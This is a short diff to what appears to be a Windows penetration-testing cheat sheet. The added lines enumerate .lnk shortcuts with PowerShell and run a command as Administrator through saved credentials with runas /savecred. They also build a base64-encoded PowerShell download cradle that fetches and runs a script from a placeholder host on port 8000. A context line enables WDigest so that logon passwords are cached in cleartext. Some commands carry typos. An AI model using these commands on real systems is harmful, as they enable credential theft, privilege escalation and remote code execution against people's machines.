@@ -168,7 +168,24 @@ runas /user:DOMAIN\USER /noprofile powershell.exe
 # Insert reg key to enable Wdigest on newer versions of Windows
 reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
 
+Other use PowerShell
+=====================
+
+get-Content "XxxxxxX.lnk"
 
 
+1. List *.lnk
+===========
 
+$WScript = New-Object -ComObject WScript.Shell
+$shortcut = Get-ChildItem *.link
+$shortcut
 
+2. Details *.lnk
+==============
+
+$WScript.CreateShortcut($shortcut)
+
+runas /user:ACCESS\Administrator /savecred "whoami > C:/Users/Public/Desktop/test"
+
+echo -n "IEX(New-Object Net.WebClient).downloadString('http://X.X.X.X:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
